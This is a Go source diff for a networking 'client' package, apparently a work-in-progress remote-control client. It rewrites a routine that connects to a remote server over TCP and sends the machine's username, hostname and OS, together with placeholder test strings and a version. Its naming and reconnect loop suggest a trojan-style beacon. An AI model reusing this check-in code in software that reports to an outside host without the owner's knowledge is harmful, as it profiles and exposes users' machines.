@@ -1,9 +1,7 @@
 package client
 
 import (
-	"bufio"
 	"encoding/base64"
-	"encoding/binary"
 	"fmt"
 	"net"
 	"os"
@@ -28,6 +26,7 @@ func Ma() {
 // 连接远程服务器
 func connect() {
 	//建立tcp连接
+
 	conn, err := net.Dial("tcp", IP)
 	//连接失败进行重连
 	if err != nil {
@@ -51,19 +50,31 @@ func maConnet() {
 		panic(err)
 	}
 	defer socket.Close()
-	IP := "127.0.0.1"
-	writer := bufio.NewWriter(socket)
 
-	binary.Write(writer, binary.LittleEndian, []byte(HEAD))
-	binary.Write(writer, binary.LittleEndian, []byte(os.Getenv("USERNAME")))
-	binary.Write(writer, binary.LittleEndian, []byte(os.Getenv("HOSTNAME")))
-	binary.Write(writer, binary.LittleEndian, []byte(os.Getenv("OS")))
-	binary.Write(writer, binary.LittleEndian, []byte(IP))
-	binary.Write(writer, binary.LittleEndian, []byte("测试地址"))
-	binary.Write(writer, binary.LittleEndian, []byte("测试名字"))
-	binary.Write(writer, binary.LittleEndian, []byte(strconv.Itoa(1111)))
-	binary.Write(writer, binary.LittleEndian, []byte("测试"))
-	binary.Write(writer, binary.LittleEndian, []byte(VERSION))
-	writer.Flush()
+	socket.Write([]byte(HEAD))
+	socket.Write([]byte(os.Getenv("USERNAME")))
+	socket.Write([]byte(os.Getenv("HOSTNAME")))
+	socket.Write([]byte(os.Getenv("OS")))
+	socket.Write([]byte(IP))
+	socket.Write([]byte("测试地址"))
+	socket.Write([]byte("测试名字"))
+	socket.Write([]byte(strconv.Itoa(1111)))
+	socket.Write([]byte("测试"))
+	socket.Write([]byte(VERSION))
+	fmt.Println("aaaaaaaaaaaaaa")
+	//IP := "127.0.0.1"
+	//writer := bufio.NewWriter(socket)
+
+	//binary.Write(writer, binary.LittleEndian, []byte(HEAD))
+	//binary.Write(writer, binary.LittleEndian, []byte(os.Getenv("USERNAME")))
+	//binary.Write(writer, binary.LittleEndian, []byte(os.Getenv("HOSTNAME")))
+	//binary.Write(writer, binary.LittleEndian, []byte(os.Getenv("OS")))
+	//binary.Write(writer, binary.LittleEndian, []byte(IP))
+	//binary.Write(writer, binary.LittleEndian, []byte("测试地址"))
+	//binary.Write(writer, binary.LittleEndian, []byte("测试名字"))
+	//binary.Write(writer, binary.LittleEndian, []byte(strconv.Itoa(1111)))
+	//binary.Write(writer, binary.LittleEndian, []byte("测试"))
+	//binary.Write(writer, binary.LittleEndian, []byte(VERSION))
+	//writer.Flush()
 
 }
